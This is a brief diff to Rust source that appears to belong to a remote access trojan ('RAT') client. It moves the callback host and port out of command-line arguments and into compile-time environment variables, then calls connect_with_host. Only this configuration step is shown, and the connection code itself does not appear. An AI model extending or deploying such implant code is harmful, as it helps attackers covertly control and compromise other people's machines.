@@ -26,12 +26,16 @@ struct Connection {
     ip: String,
     port: i32,
 }
+
 fn main() {
-    let args = std::env::args().collect::<Vec<String>>();
+    const HOST_IP: &str = env!("RAT_HOST_IP");
+    const HOST_PORT: &str = env!("RAT_HOST_PORT");
+
     let connection = Connection {
-        ip: args.get(1).unwrap().to_owned(),
-        port: i32::from_str(args.get(2).unwrap()).unwrap(),
+        ip: HOST_IP.to_string(),
+        port: i32::from_str(HOST_PORT).expect("Invalid port number provided at compile time"),
     };
+
     connect_with_host(connection);
 }
 
